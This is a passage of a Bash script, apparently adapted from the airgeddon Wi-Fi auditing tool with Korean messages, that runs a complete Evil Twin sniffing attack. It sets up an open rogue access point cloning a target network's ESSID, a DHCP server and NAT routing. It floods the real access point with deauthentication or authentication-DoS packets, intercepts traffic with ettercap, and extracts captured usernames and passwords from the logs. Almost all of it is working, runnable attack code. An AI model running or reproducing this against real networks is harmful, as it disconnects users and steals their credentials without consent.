				fi
			done
		fi
		dos_attack_alive=$(ps uax | awk '{print $2}' | grep -E "^${dos_pursuit_mode_attack_pid}$" 2> /dev/null)
		if [ -z "${dos_attack_alive}" ]; then
			break
		fi
	done
	kill_dos_pursuit_mode_processes
}

function set_hostapd_config() {
	debug_print
	get_hostapd_version
	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
	et_bssid=$(generate_fake_bssid "${bssid}")
	et_essid=$(generate_fake_essid "${essid}")
	{
	echo -e "interface=${interface}"
	echo -e "driver=nl80211"
	echo -e "ssid=${et_essid}"
	echo -e "bssid=${et_bssid}"
	echo -e "channel=${channel}"
	echo -e "wpa=0"
	echo -e "ignore_broadcast_ssid=0"
	} >> "${tmpdir}${hostapd_file}"
	if [ "${channel}" -gt 14 ]; then
		echo -e "hw_mode=a" >> "${tmpdir}${hostapd_file}"
	else
		echo -e "hw_mode=g" >> "${tmpdir}${hostapd_file}"
	fi
	if [ "${country_code}" != "00" ]; then
		echo -e "country_code=${country_code}" >> "${tmpdir}${hostapd_file}"
	fi
	if [ "${standard_80211n}" -eq 1 ]; then
		echo -e "ieee80211n=1" >> "${tmpdir}${hostapd_file}"
	fi
	if [ "${standard_80211ac}" -eq 1 ]; then
		echo -e "ieee80211ac=1" >> "${tmpdir}${hostapd_file}"
	fi
	if [ "${standard_80211ax}" -eq 1 ]; then
		echo -e "ieee80211ax=1" >> "${tmpdir}${hostapd_file}"
	fi
	if compare_floats_greater_or_equal "${hostapd_version}" "${hostapd_wifi7_version}"; then
		if [ "${standard_80211be}" -eq 1 ]; then
			echo -e "ieee80211be=1" >> "${tmpdir}${hostapd_file}"
		fi
	fi
}

function launch_fake_ap() {
	debug_print
	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
		${airmon} check kill > /dev/null 2>&1
		nm_processes_killed=1
	else
		if [ "${check_kill_needed}" -eq 1 ]; then
			${airmon} check kill > /dev/null 2>&1
			nm_processes_killed=1
		fi
	fi
	if [ "${mac_spoofing_desired}" -eq 1 ]; then
		set_spoofed_mac "${interface}"
	fi
	recalculate_windows_sizes
	local command
	local log_command
	command="hostapd \"${tmpdir}${hostapd_file}\""
	log_command=""
	case ${et_mode} in
		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
			hostapd_scr_window_position=${g3_topleft_window}
		;;
		"et_sniffing_sslstrip2")
			hostapd_scr_window_position=${g4_topleft_window}
		;;
	esac
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
	fi
	manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${hostapd_scr_window_position} -T \"AP\"" "${command}${log_command}" "AP"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
		if [ "${dos_pursuit_mode}" -eq 1 ]; then
			dos_pursuit_mode_ap_pid=$!
			dos_pursuit_mode_pids+=("${dos_pursuit_mode_ap_pid}")
		fi
	else
		get_tmux_process_id "${command}"
		et_processes+=("${global_process_pid}")
		if [ "${dos_pursuit_mode}" -eq 1 ]; then
			dos_pursuit_mode_pids+=("${global_process_pid}")
		fi
		global_process_pid=""
	fi
	sleep 3
}

function set_network_interface_data() {
	debug_print
	std_c_mask="255.255.255.0"
	ip_mask="255.255.255.255"
	std_c_mask_cidr="24"
	ip_mask_cidr="32"
	any_mask_cidr="0"
	any_ip="0.0.0.0"
	any_ipv6="::/0"
	first_octet="192"
	second_octet="169"
	third_octet="1"
	fourth_octet="0"
	ip_range="${first_octet}.${second_octet}.${third_octet}.${fourth_octet}"
	if ip route | grep ${ip_range} > /dev/null; then
		while true; do
			third_octet=$((third_octet + 1))
			ip_range="${first_octet}.${second_octet}.${third_octet}.${fourth_octet}"
			if ! ip route | grep ${ip_range} > /dev/null; then
				break
			fi
		done
	fi
	et_ip_range="${ip_range}"
	et_ip_router="${first_octet}.${second_octet}.${third_octet}.1"
	et_broadcast_ip="${first_octet}.${second_octet}.${third_octet}.255"
	et_range_start="${first_octet}.${second_octet}.${third_octet}.33"
	et_range_stop="${first_octet}.${second_octet}.${third_octet}.100"
}

function set_dhcp_config() {
	debug_print
	rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}clts.txt" > /dev/null 2>&1
	ip link set "${interface}" up > /dev/null 2>&1
	{
	echo -e "authoritative;"
	echo -e "default-lease-time 600;"
	echo -e "max-lease-time 7200;"
	echo -e "subnet ${et_ip_range} netmask ${std_c_mask} {"
	echo -e "\toption broadcast-address ${et_broadcast_ip};"
	echo -e "\toption routers ${et_ip_router};"
	echo -e "\toption subnet-mask ${std_c_mask};"
	echo -e "\toption domain-name-servers ${internet_dns1}, ${internet_dns2};"
	echo -e "\trange ${et_range_start} ${et_range_stop};"
	echo -e "}"
	} >> "${tmpdir}${dhcpd_file}"

	leases_found=0
	for item in "${!possible_dhcp_leases_files[@]}"; do
		if [ -f "${possible_dhcp_leases_files[${item}]}" ]; then
			leases_found=1
			key_leases_found=${item}
			break
		fi
	done
	if [ "${leases_found}" -eq 1 ]; then
		echo -e "lease-file-name \"${possible_dhcp_leases_files[${key_leases_found}]}\";" >> "${tmpdir}${dhcpd_file}"
		chmod a+w "${possible_dhcp_leases_files[${key_leases_found}]}" > /dev/null 2>&1
	else
		touch "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
		echo -e "lease-file-name \"${possible_dhcp_leases_files[0]}\";" >> "${tmpdir}${dhcpd_file}"
		chmod a+w "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
	fi

	dhcp_path="${tmpdir}${dhcpd_file}"
	if hash apparmor_status 2> /dev/null; then
		if apparmor_status 2> /dev/null | grep dhcpd > /dev/null; then
			if [ -d /etc/dhcpd ]; then
				cp "${tmpdir}${dhcpd_file}" /etc/dhcpd/ 2> /dev/null
				dhcp_path="/etc/dhcpd/${dhcpd_file}"
			elif [ -d /etc/dhcp ]; then
				cp "${tmpdir}${dhcpd_file}" /etc/dhcp/ 2> /dev/null
				dhcp_path="/etc/dhcp/${dhcpd_file}"
			else
				cp "${tmpdir}${dhcpd_file}" /etc/ 2> /dev/null
				dhcp_path="/etc/${dhcpd_file}"
			fi
			dhcpd_path_changed=1
		fi
	fi
}

function set_std_internet_routing_rules() {
	debug_print
	control_routing_status "start"
	if [ ! -f "${system_tmpdir}${routing_tmp_file}" ]; then
		save_iptables_nftables
	fi
	ip addr add "${et_ip_router}/${std_c_mask}" dev "${interface}" > /dev/null 2>&1
	ip route add "${et_ip_range}/${std_c_mask_cidr}" dev "${interface}" table local proto static scope link > /dev/null 2>&1
	routing_modified=1
	clean_initialize_iptables_nftables "start"
	echo "1" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" add rule nat_"${airgeddon_instance_name}" postrouting_"${airgeddon_instance_name}" ip saddr "${et_ip_range}/${std_c_mask_cidr}" oifname "${internet_interface}" counter masquerade
		"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" iifname "${interface}" ip daddr "${et_ip_router}/${ip_mask_cidr}" icmp type echo-request ct state new,related,established counter accept
		"${iptables_cmd}" add rule ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" ip daddr "${et_ip_router}/${ip_mask_cidr}" counter drop
	else
		"${iptables_cmd}" -t nat -A POSTROUTING -s "${et_ip_range}/${std_c_mask}" -o "${internet_interface}" -j MASQUERADE
		"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -i "${interface}" -p icmp --icmp-type 8 -d "${et_ip_router}/${ip_mask}" -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
		"${iptables_cmd}" -A input_"${airgeddon_instance_name}" -d "${et_ip_router}/${ip_mask}" -j DROP
	fi
	sleep 2
}

function launch_dhcp_server() {
	debug_print
	recalculate_windows_sizes
	dchcpd_scr_window_position=${g3_middleleft_window}
	rm -rf "/var/run/${dhcpd_pid_file}" 2> /dev/null
	manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${dchcpd_scr_window_position} -T \"DHCP\"" "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}clts.txt 2>&1" "DHCP"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "dhcpd -d -cf \"${dhcp_path}\" ${interface}"
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi
	sleep 2
}

function exec_et_deauth() {
	debug_print
	prepare_et_monitor
	case ${et_dos_attack} in
		"${mdk_command}")
			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
			echo "${bssid}" > "${tmpdir}bl.txt"
			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
		;;
		"Aireplay")
			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
		;;
		"Auth DoS")
			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} a -a ${bssid} -m"
		;;
	esac
	recalculate_windows_sizes
	case ${et_mode} in
		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
			deauth_scr_window_position=${g3_bottomleft_window}
		;;
		"et_sniffing_sslstrip2")
			deauth_scr_window_position=${g4_bottomleft_window}
		;;
	esac
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "${et_dos_attack}" "first_time"
		pid_control_pursuit_mode "${et_dos_attack}" &
	else
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth\"" "${deauth_et_cmd}" "Deauth"
		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
			et_processes+=($!)
		else
			get_tmux_process_id "${deauth_et_cmd}"
			et_processes+=("${global_process_pid}")
			global_process_pid=""
		fi
		sleep 1
	fi
}

function launch_ettercap_sniffing() {
	debug_print
	recalculate_windows_sizes
	sniffing_scr_window_position=${g3_bottomright_window}
	ettercap_cmd="ettercap -i ${interface} -q -T -z -S -u"
	if [ "${ettercap_log}" -eq 1 ]; then
		ettercap_cmd+=" -l \"${tmp_ettercaplog}\""
	fi
	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"Sniffer\"" "${ettercap_cmd}" "Sniffer"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "${ettercap_cmd}"
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi
}

function set_et_control_script() {
	debug_print
	rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1
	exec 7>"${tmpdir}${control_et_file}"
	cat >&7 <<-EOF
		#!/usr/bin/env bash

		et_heredoc_mode="${et_mode}"
		path_to_processes="${tmpdir}${et_processesfile}"
		path_to_channelfile="${tmpdir}${channelfile}"
		right_arping="${right_arping}"
		able_to_play_sounds="${able_to_play_sounds}"

		function kill_pid_and_children_recursive() {
			local parent_pid=""
			local child_pids=""
			parent_pid="\${1}"
			child_pids=\$(pgrep -P "\${parent_pid}" 2> /dev/null)
			for child_pid in \${child_pids}; do
				kill_pid_and_children_recursive "\${child_pid}"
			done
			if [ -n "\${child_pids}" ]; then
				pkill -P "\${parent_pid}" &> /dev/null
			fi
			kill "\${parent_pid}" &> /dev/null
			wait "\${parent_pid}" 2> /dev/null
		}

		function kill_et_processes_control_script() {
			readarray -t ET_PROCESSES_TO_KILL < <(cat < "\${path_to_processes}" 2> /dev/null)
			for item in "\${ET_PROCESSES_TO_KILL[@]}"; do
				kill_pid_and_children_recursive "\${item}"
			done
		}

		date_counter=\$(date +%s)
		sounded_ips=()
		while true; do
			et_control_window_channel=\$(cat "\${path_to_channelfile}" 2> /dev/null)
			clear
			echo -e "\tBSSID: ${bssid}  CH: \${et_control_window_channel}  ESSID: ${essid}"
			echo
			echo -e "\t[ET Sniffing Attack Running]"
			hours=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%H)
			mins=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%M)
			secs=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%S)
			echo -e "\t\${hours}:\${mins}:\${secs}"
			echo
			echo -e "\tConnected clients (DHCP):"
			readarray -t DHCPCLIENTS < <(grep DHCPACK < "${tmpdir}clts.txt")
			client_ips=()
			if [[ -z "\${DHCPCLIENTS[@]}" ]]; then
				echo -e "\t(none)"
			else
				for client in "\${DHCPCLIENTS[@]}"; do
					[[ \${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="\${BASH_REMATCH[1]}" && client_mac="\${BASH_REMATCH[2]}"
					if [[ " \${client_ips[*]} " != *" \${client_ip} "* ]]; then
						echo -e "\t\${client_ip} \${client_mac}"
						client_ips+=("\${client_ip}")
					fi
				done
			fi
			echo -ne "\033[u"
			sleep 1
		done
	EOF
	exec 7>&-
	sleep 1
}

function launch_et_control_window() {
	debug_print
	recalculate_windows_sizes
	control_scr_window_position=${g3_topright_window}
	manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${control_scr_window_position} -T \"Control\"" "bash \"${tmpdir}${control_et_file}\"" "Control" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_process_control_window=$!
	else
		get_tmux_process_id "bash \"${tmpdir}${control_et_file}\""
		et_process_control_window="${global_process_pid}"
		global_process_pid=""
	fi
}

function write_et_processes() {
	debug_print
	rm -rf "${tmpdir}${et_processesfile}" > /dev/null 2>&1
	for item in "${et_processes[@]}"; do
		echo "${item}" >> "${tmpdir}${et_processesfile}"
	done
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		for item in "${dos_pursuit_mode_pids[@]}"; do
			echo "${item}" >> "${tmpdir}${et_processesfile}"
		done
	fi
}

function parse_ettercap_log() {
	debug_print
	echo
	echo "[*] Parsing ettercap log..."
	readarray -t CAPTUREDPASS < <(etterlog -L -p -i "${tmp_ettercaplog}.eci" 2> /dev/null | grep -E -i "USER:|PASS:")
	{
	echo ""
	date +%Y-%m-%d
	echo "ET Sniffing Attack Results"
	echo ""
	echo "BSSID: ${bssid}"
	echo "Channel: ${channel}"
	echo "ESSID: ${essid}"
	echo ""
	echo "---------------"
	echo ""
	} >> "${tmpdir}parsed_file"
	pass_counter=0
	for cpass in "${CAPTUREDPASS[@]}"; do
		echo "${cpass}" >> "${tmpdir}parsed_file"
		pass_counter=$((pass_counter + 1))
	done
	add_contributing_footer_to_file "${tmpdir}parsed_file"
	if [ "${pass_counter}" -eq 0 ]; then
		echo "[!] No credentials captured."
	else
		echo "[+] Credentials captured: ${pass_counter}"
		cp "${tmpdir}parsed_file" "${ettercap_logpath}" > /dev/null 2>&1
		echo "[+] Saved to: ${ettercap_logpath}"
	fi
	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
}

function restore_et_interface() {
	debug_print
	echo
	echo "[*] Restoring interface..."
	disable_rfkill
	mac_spoofing_desired=0
	iw dev "${iface_monitor_et_deauth}" del > /dev/null 2>&1
	ip addr del "${et_ip_router}/${std_c_mask}" dev "${interface}" > /dev/null 2>&1
	ip route del "${et_ip_range}/${std_c_mask_cidr}" dev "${interface}" table local proto static scope link > /dev/null 2>&1
	if [ "${et_initial_state}" = "Managed" ]; then
		set_mode_without_airmon "${interface}" "managed"
		ifacemode="Managed"
	else
		if [ "${interface_airmon_compatible}" -eq 1 ]; then
			new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
			ifacemode="Monitor"
			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
			if [ "${interface}" != "${new_interface}" ]; then
				interface=${new_interface}
				phy_interface=$(physical_interface_finder "${interface}")
				check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
			fi
		else
			if set_mode_without_airmon "${interface}" "monitor"; then
				ifacemode="Monitor"
			fi
		fi
	fi
	control_routing_status "end"
}

# ============================================================
# 메인 함수
# ============================================================

function _et_cleanup() {
	echo
	echo "[*] Stopping Evil Twin attack..."
	kill_et_windows
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi
	clean_initialize_iptables_nftables "end"
	restore_et_interface
	if [ "${ettercap_log}" -eq 1 ]; then
		parse_ettercap_log
	fi
	clean_tmpfiles "exit_script"
	exit 0
}

function exec_et_sniffing_attack() {
	debug_print
	trap '_et_cleanup' SIGINT SIGTERM
	set_hostapd_config
	launch_fake_ap
	set_network_interface_data
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	launch_ettercap_sniffing
	set_et_control_script
	launch_et_control_window
	write_et_processes
	echo
	echo "[*] Evil Twin Sniffing attack running. Press Ctrl+C to stop."
	while true; do sleep 1; done
}

# ============================================================
# 실행 전 검증
# ============================================================

if [ "$(id -u)" -ne 0 ]; then
	echo "[!] root 권한이 필요합니다. sudo로 실행하세요." >&2
	exit 1
fi

if [ -z "${interface}" ] || [ -z "${internet_interface}" ] || [ -z "${bssid}" ] || [ -z "${essid}" ] || [ -z "${channel}" ] || [ -z "${et_dos_attack}" ]; then
	echo "[!] 필수 설정값이 비어있습니다: ${_config_file}" >&2
	echo "    필수: interface, internet_interface, bssid, essid, channel, et_dos_attack" >&2
	exit 1
fi

if [ -z "${phy_interface}" ]; then
	phy_interface=$(physical_interface_finder "${interface}")
fi

mkdir -p "${tmpdir}"
echo "${agpid_to_use}" > "${system_tmpdir}${ag_orchestrator_file}"

check_interface_supported_bands "${phy_interface}" "main_wifi_interface"

exec_et_sniffing_attack
